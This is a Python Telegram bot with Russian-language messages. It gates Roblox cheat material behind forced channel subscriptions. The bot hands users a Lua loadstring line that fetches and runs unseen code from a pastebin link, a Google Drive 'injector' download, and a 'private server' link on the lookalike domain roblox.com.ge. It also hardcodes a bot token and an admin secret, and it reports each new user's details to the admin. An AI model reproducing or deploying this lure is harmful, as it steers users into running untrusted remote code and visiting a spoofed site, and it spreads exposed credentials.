import telebot
import random
from telebot import types
import sqlite3
import os
import socket
from threading import Thread

TOKEN = os.environ.get("TOKEN", "8793302361:AAHCxbHJ6v_oCyjHqiafsHHaf7Xr1EvkDO8")
ADMIN_ID = 8091608667
ADMIN_SECRET = "larscriptkryyyyyyt"

DB_FILE = os.path.join(os.path.dirname(os.path.abspath(__file__)), "bot_users.db")

def init_db():
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    c.execute("CREATE TABLE IF NOT EXISTS users (user_id INTEGER PRIMARY KEY)")
    conn.commit()
    conn.close()

def add_user(user_id):
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    c.execute("SELECT user_id FROM users WHERE user_id = ?", (user_id,))
    exists = c.fetchone()
    if not exists:
        c.execute("INSERT INTO users VALUES (?)", (user_id,))
        conn.commit()
        conn.close()
        return True
    conn.close()
    return False

def get_all_users():
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    c.execute("SELECT user_id FROM users")
    users = [row[0] for row in c.fetchall()]
    conn.close()
    return users

def count_users():
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    c.execute("SELECT COUNT(*) FROM users")
    count = c.fetchone()[0]
    conn.close()
    return count

init_db()

CHANNELS = [
    {"name": "freprivatka34", "url": "https://t.me/freprivatka34"},
    {"name": "freegodlymm2_67", "url": "https://t.me/freegodlymm2_67"},
    {"name": "keyscripts3", "url": "https://t.me/keyscripts3"}
]

KEYS = ["МОПС", "СКИТ", "ТАКСА", "КИТ", "LARS", "MOPS", "ARDOR", "MALTUIPY"]
PRIVATE_SERVER_LINK = "https://roblox.com.ge/games/142823291/Murder-Mystery-2?privateServerLinkCode=67807728184198406550153024608844"
SCRIPT_LINK = "loadstring(game:HttpGet(\"https://pastebin.com/raw/GdQULgA6\"))()"
DELTA_LINK = "https://drive.google.com/file/d/1G2gniClYv0qV0BU9-xfYD4UOcxUljH4s/view?usp=sharing"

bot = telebot.TeleBot(TOKEN)

def notify_admin(text):
    try:
        bot.send_message(ADMIN_ID, text, parse_mode="Markdown")
    except:
        pass

def is_admin(user_id):
    return user_id == ADMIN_ID

def get_unsubscribed_channels(user_id):
    not_subbed = []
    for ch in CHANNELS:
        try:
            member = bot.get_chat_member(f"@{ch['name']}", user_id)
            if member.status not in ["member", "administrator", "creator"]:
                not_subbed.append(ch)
        except:
            not_subbed.append(ch)
    return not_subbed

def get_channels_keyboard():
    keyboard = types.InlineKeyboardMarkup(row_width=1)
    for ch in CHANNELS:
        keyboard.add(types.InlineKeyboardButton(
            text=f"Подписаться ✅ {ch['name']}",
            url=ch['url']
        ))
    keyboard.add(types.InlineKeyboardButton(
        text="🔍 Проверить подписку",
        callback_data="check_sub"
    ))
    return keyboard

def get_unsub_keyboard(not_subbed):
    keyboard = types.InlineKeyboardMarkup(row_width=1)
    for ch in not_subbed:
        keyboard.add(types.InlineKeyboardButton(
            text=f"Подписаться ❎ {ch['name']}",
            url=ch['url']
        ))
    keyboard.add(types.InlineKeyboardButton(
        text="🔍 Проверить снова",
        callback_data="check_sub"
    ))
    return keyboard

def get_success_keyboard():
    keyboard = types.InlineKeyboardMarkup(row_width=1)
    keyboard.add(types.InlineKeyboardButton(text="📜 Скрипт на все игры", callback_data="get_script"))
    keyboard.add(types.InlineKeyboardButton(text="🔑 Ключ", callback_data="get_key"))
    keyboard.add(types.InlineKeyboardButton(text="🔒 Приватный сервер MM2", callback_data="get_private"))
    keyboard.add(types.InlineKeyboardButton(text="📥 Скачать инжектор (Delta)", url=DELTA_LINK))
    return keyboard

@bot.message_handler(commands=["start"])
def start(message):
    is_new = add_user(message.from_user.id)
    if is_new:
        user = message.from_user
        text = f"🆕 Новый пользователь!\n\n🆔 ID: `{user.id}`\n👤 Имя: {user.first_name}\n📛 Username: @{user.username if user.username else 'нет'}\n👥 Всего пользователей: {count_users()}"
        notify_admin(text)
    bot.send_message(message.chat.id, "😌 Чтобы продолжить пользоваться ботом, пожалуйста, выполни следующие задания!", reply_markup=get_channels_keyboard())

@bot.message_handler(commands=["getkey"])
def getkey(message):
    add_user(message.from_user.id)
    not_subbed = get_unsubscribed_channels(message.from_user.id)
    if not not_subbed:
        key = random.choice(KEYS)
        bot.send_message(message.chat.id, f"🔑 Твой ключ: {key}", parse_mode="Markdown")
    else:
        bot.send_message(message.chat.id, "📢 Подпишитесь на каналы для получения скрипта и ключа", reply_markup=get_unsub_keyboard(not_subbed))

@bot.callback_query_handler(func=lambda call: call.data in ["check_sub", "get_script", "get_key", "get_private"])
def user_callback(call):
    action = call.data
    user_id = call.from_user.id
    
    if action == "check_sub":
        not_subbed = get_unsubscribed_channels(user_id)
        if not not_subbed:
            bot.send_message(call.message.chat.id, "✅ Подписка подтверждена!\n\nВыбери что хочешь получить:", reply_markup=get_success_keyboard())
        else:
            text = "❌ Осталось подписаться:\n\n"
            for ch in not_subbed:
                text += f"❎ {ch['name']}\n"
            bot.send_message(call.message.chat.id, text, reply_markup=get_unsub_keyboard(not_subbed))
    
    elif action == "get_script":
        bot.send_message(call.message.chat.id, f"📜 Скрипт на все игры:\n\n```lua\n{SCRIPT_LINK}\n```", parse_mode="Markdown")
        bot.answer_callback_query(call.id, "Скрипт отправлен!")
    
    elif action == "get_key":
        key = random.choice(KEYS)
        bot.send_message(call.message.chat.id, f"🔑 Твой ключ:\n\n`{key}`\n\nСкопируй и вставь в скрипт.", parse_mode="Markdown")
        bot.answer_callback_query(call.id, "Ключ отправлен!")
    
    elif action == "get_private":
        bot.send_message(call.message.chat.id, f"🔒 Приватный сервер MM2\n\n{PRIVATE_SERVER_LINK}")
        bot.answer_callback_query(call.id, "Приватка отправлена!")

def run_server():
    port = int(os.environ.get("PORT", 10000))
    s = socket.socket()
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    s.bind(('0.0.0.0', port))
    s.listen(1)
    print(f"Port {port} opened")
    while True:
        c, _ = s.accept()
        c.send(b"HTTP/1.1 200 OK\r\n\r\nBot running")
        c.close()

Thread(target=run_server).start()
bot.polling()
